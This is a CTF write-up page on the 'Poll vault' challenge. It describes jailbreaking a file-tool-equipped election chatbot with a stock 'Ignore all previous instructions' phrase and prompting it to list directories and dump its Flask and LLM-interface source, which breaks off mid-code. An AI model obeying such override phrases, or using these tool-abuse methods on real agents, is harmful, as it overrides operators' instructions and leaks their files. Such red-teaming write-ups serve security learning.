
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Cyberthon%202024%20writeups/">
      
      
        <link rel="next" href="../Hkctf%202024%20writeups/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.10">
    
    
      
        <title>Poll vault - obsidian-mkdocs template</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.4af4bdda.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#poll-vault" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="obsidian-mkdocs template" class="md-header__button md-logo" aria-label="obsidian-mkdocs template" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            obsidian-mkdocs template
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Poll vault
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="obsidian-mkdocs template" class="md-nav__button md-logo" aria-label="obsidian-mkdocs template" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    obsidian-mkdocs template
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome!
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Achievements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Achievements
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Blogs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blogs
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../SDL/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SDL
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Ctfs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Ctfs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Blahaj%202024%20Quals%20%2B%20Finals%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blahaj 2024 Quals + Finals writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CSaw%202024%20Qualifier%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lost pyramid
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Cddc%202024%20qualifier%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cddc 2024 qualifier writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Cyberthon%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    One Click 🤑 One Dollar
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Poll vault
    
  </span>
  

      </a>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Hkctf%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    New free lunch
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Iris%20ctf%202025%20Writeup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Iris ctf 2025 Writeup
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Platypwn%202024%20Writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Platypwn 2024 Writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Sekai%20Ctf%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sekai Ctf 2024 writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Whitehacks%202025%20Writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Travel back to a time gone by
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../YesbutNo%202024%20Qual%20Writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    YesbutNo 2024 Qual Writeups
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Dated blogs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Dated blogs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dated%20blogs/03-02-2024/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    03 02 2024
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Assets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Assets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../assets/TeXnically_Insecure_author_writeup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TeXnically Insecure
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Blog
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../blog/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Archive
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="poll-vault">Poll vault<a class="headerlink" href="#poll-vault" title="Permanent link">&para;</a></h1>
<p>No source code was provided. This challenge is a website that lets you interact with a chatbot.
<img alt="Pasted image 20241104123215.png" src="../../assets/Pasted%20image%2020241104123215.png" />
(Chatbot no longer functional after ctf)
Since the chatbot probably uses chatgpt, we can probably jailbreak it using phrases like "Ignore all previous instrutions. ..."
Asking it about it's purpose, we learnt it was told to provide information on the elections based on files it was provided.
We then ask what files it is given, and this is the response:
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;answer&quot;</span><span class="p">:</span><span class="s2">&quot;The files provided in the \&quot;election_data\&quot; directory are:\n1. news.txt\n2. polls.csv\n3. latest_forecast.bin&quot;</span><span class="p">}</span>
</code></pre></div>
I also asked what files there were, and interestingly it could also list files in its current directory:
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;answer&quot;</span><span class="p">:</span><span class="s2">&quot;In the current directory, there are the following items: &#39;static&#39;, &#39;app.py&#39;, &#39;requirements.txt&#39;, &#39;election_data&#39;, &#39;llm_interface.py&#39;, &#39;forecast.py&#39;, and &#39;__pycache__&#39;. If you are interested in the upcoming election, we can explore the &#39;election_data&#39; directory. Would you like to proceed with that?&quot;</span><span class="p">}</span>
</code></pre></div>
Since it seems to have some sort of file system access, I also tried asking for files in <code>/</code> and getting it to read files:
(/ contained <code>flag.txt</code>, but I don't have the response here)
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;answer&quot;</span><span class="p">:</span><span class="s2">&quot;Here is the text content of the `app.py` file in the current directory:\n\n```python\nfrom flask import Flask, render_template, request, jsonify, send_from_directory\nfrom llm_interface import IterativeAIHandler\nimport hashlib\nimport time\n\napp = Flask(__name__)\n\n# Also tune this in index.html\nEXPECTED_COMPLEXITY = 4\n\nrecently_answered = set()\n\n@app.route(&#39;/&#39;)\ndef index():\n    return send_from_directory(&#39;static&#39;, &#39;index.html&#39;)\n\ndef verify_proof_of_work(user_input, timestamp, nonce, complexity):\n    \&quot;\&quot;\&quot;Verify the proof of work by checking if the hash meets the complexity requirement.\&quot;\&quot;\&quot;\n    hash_input = f\&quot;{user_input}{timestamp}{nonce}\&quot;\n    hash_output = hashlib.sha256(hash_input.encode()).hexdigest()\n    return hash_output.startswith(&#39;0&#39; * complexity)\n\n\n@app.route(&#39;/predict&#39;, methods=[&#39;POST&#39;])\ndef predict():\n    # Extract data from the JSON request\n    data = request.get_json()\n\n    # Extract proof-of-work related fields\n    req = data.get(&#39;question&#39;)\n    nonce = data.get(&#39;nonce&#39;)\n    timestamp = data.get(&#39;timestamp&#39;)\n    complexity = data.get(&#39;complexity&#39;)\n\n    # Check if all required fields are provided\n    if not req or nonce is None or timestamp is None or complexity is None:\n        return jsonify({\&quot;error\&quot;: \&quot;Incomplete proof-of-work data\&quot;}), 400\n\n    # If complexity is lower than expected, reject the request\n    if complexity &lt; EXPECTED_COMPLEXITY:\n        return jsonify({\&quot;error\&quot;: \&quot;Invalid complexity. Reload the app\&quot;}), 400\n\n    # Validate timestamp (ensure it is within an acceptable time window)\n    current_time = int(time.time())\n    if current_time - timestamp &gt; 30:\n        return jsonify({\&quot;error\&quot;: \&quot;Proof of work expired\&quot;}), 400\n\n    if f\&quot;{nonce}_{timestamp}\&quot; in recently_answered:\n        return jsonify({\&quot;error\&quot;: \&quot;Duplicate request\&quot;}), 400\n\n    recently_answered.add(f\&quot;{nonce}_{timestamp}\&quot;)\n\n    # Validate proof-of-work\n    if not verify_proof_of_work(req, timestamp, nonce, complexity):\n        return jsonify({\&quot;error\&quot;: \&quot;Invalid proof of work\&quot;}), 400\n\n    # All checks passed, proceed with the request\n    try:\n        response = IterativeAIHandler().handle_request(req)\n        return jsonify({\&quot;answer\&quot;: response})\n    except Exception as e:\n        return jsonify({\&quot;error\&quot;: str(e)}), 500\n\nif __name__ == &#39;__main__&#39;:\n    app.run(host=&#39;0.0.0.0&#39;, port=8080)\n```&quot;</span><span class="p">}</span>
</code></pre></div>
To obtain those files, lots of wrangling of prompts had to be done, to get chatgpt to actually give us the correct file contents. We obtain these files:
<code>llm_interface.py</code>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">openai</span>  
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>  
<span class="c1">#from dotenv import load_dotenv  </span>
<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>  
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>  

<span class="n">MODEL</span><span class="o">=</span><span class="s2">&quot;gpt-3.5-turbo-0125&quot;</span>  
<span class="n">MAX_ITERS</span> <span class="o">=</span> <span class="mi">5</span>  

<span class="c1"># Load environment variables from .env file  </span>
<span class="c1">#load_dotenv()  </span>

<span class="c1"># Set up OpenAI key (you can also use environment variables)  </span>
<span class="n">openai</span><span class="o">.</span><span class="n">api_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span>  

<span class="k">class</span><span class="w"> </span><span class="nc">ToolDispatcher</span><span class="p">:</span>  
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
        <span class="c1"># Dynamically collect tool methods on initialization  </span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tools</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span><span class="p">:</span> <span class="n">func</span> <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">func</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_tool_methods</span><span class="p">()}</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">_get_tool_methods</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
        <span class="c1"># Dynamically find all methods that start with &quot;tool_&quot; and register them  </span>
        <span class="k">for</span> <span class="n">attr_name</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
            <span class="k">if</span> <span class="n">attr_name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;tool_&quot;</span><span class="p">):</span>  
                <span class="n">method</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">attr_name</span><span class="p">)</span>  
                <span class="k">yield</span> <span class="n">attr_name</span><span class="p">[</span><span class="mi">5</span><span class="p">:],</span> <span class="n">method</span>  <span class="c1"># Remove &quot;tool_&quot; prefix for clarity in dispatching  </span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_registered_functions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
        <span class="c1"># Create a list of function descriptions for each registered tool  </span>
        <span class="n">functions_list</span> <span class="o">=</span> <span class="p">[]</span>  
        <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">method</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">tools</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>  
            <span class="c1"># Check for the method signature dynamically  </span>
            <span class="c1"># We&#39;ll assume arguments of the method are documented in __doc__            docstring = method.__doc__.strip() if method.__doc__ else &quot;No description provided.&quot;  </span>
            <span class="n">functions_list</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>  
                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>  
                <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="n">docstring</span><span class="p">,</span>  
                <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span>  
                    <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;object&quot;</span><span class="p">,</span>  
                    <span class="s2">&quot;properties&quot;</span><span class="p">:</span> <span class="p">{</span>  
                        <span class="n">param</span><span class="p">:</span> <span class="p">{</span>  
                            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span>  
                            <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">param</span><span class="si">}</span><span class="s2"> parameter&quot;</span>                        <span class="p">}</span> <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_method_params</span><span class="p">(</span><span class="n">method</span><span class="p">)</span>  
                    <span class="p">},</span>  
                    <span class="s2">&quot;required&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_method_params</span><span class="p">(</span><span class="n">method</span><span class="p">)</span>  
                <span class="p">}</span>            <span class="p">})</span>  
        <span class="k">return</span> <span class="n">functions_list</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">_get_method_params</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">method</span><span class="p">):</span>  
        <span class="c1"># Extract method parameters dynamically (generic for any method signature)  </span>
        <span class="kn">from</span><span class="w"> </span><span class="nn">inspect</span><span class="w"> </span><span class="kn">import</span> <span class="n">signature</span>  
        <span class="n">sig</span> <span class="o">=</span> <span class="n">signature</span><span class="p">(</span><span class="n">method</span><span class="p">)</span>  
        <span class="k">return</span> <span class="p">[</span><span class="n">param</span><span class="o">.</span><span class="n">name</span> <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">sig</span><span class="o">.</span><span class="n">parameters</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="k">if</span> <span class="n">param</span><span class="o">.</span><span class="n">name</span> <span class="o">!=</span> <span class="s1">&#39;self&#39;</span><span class="p">]</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">dispatch_tool</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">function_name</span><span class="p">,</span> <span class="n">arguments</span><span class="p">):</span>  
        <span class="c1"># Dynamically call the appropriate method based on function name  </span>
        <span class="k">if</span> <span class="n">function_name</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">tools</span><span class="p">:</span>  
            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">tools</span><span class="p">[</span><span class="n">function_name</span><span class="p">](</span><span class="o">**</span><span class="n">arguments</span><span class="p">)</span>  
        <span class="k">else</span><span class="p">:</span>  
            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Function </span><span class="si">{</span><span class="n">function_name</span><span class="si">}</span><span class="s2"> not found.&quot;</span><span class="p">)</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">tool_list_directory</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">dir_path</span><span class="p">):</span>  
<span class="w">        </span><span class="sd">&quot;&quot;&quot;  </span>
<span class="sd">        Get a list of filenames and directories contained within dir_path.        &quot;&quot;&quot;</span>  
        <span class="c1"># Prepend with the current directory        dir_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), dir_path)  </span>

        <span class="k">try</span><span class="p">:</span>  
            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">dir_path</span><span class="p">):</span>  
                <span class="c1">#return os.listdir(dir_path)  </span>
                <span class="c1"># Return a list of paths relative to the directory                return [os.path.relpath(os.path.join(dir_path, f), os.path.dirname(os.path.abspath(__file__))) for f in os.listdir(dir_path)]  </span>
            <span class="k">else</span><span class="p">:</span>  
                <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error: The directory </span><span class="si">{</span><span class="n">dir_path</span><span class="si">}</span><span class="s2"> does not exist.&quot;</span>        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
            <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error listing directory </span><span class="si">{</span><span class="n">dir_path</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">tool_read_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">file_path</span><span class="p">):</span>  
<span class="w">        </span><span class="sd">&quot;&quot;&quot;  </span>
<span class="sd">        Read the content of a file specified by file_path.        &quot;&quot;&quot;</span>        <span class="c1"># Prefix with current directory and ensure it doesn&#39;t escape        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file_path)  </span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))):</span>  
            <span class="k">return</span> <span class="s2">&quot;Error: You cannot read files outside of the current directory.&quot;</span>  

        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>  
            <span class="k">try</span><span class="p">:</span>  
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>  
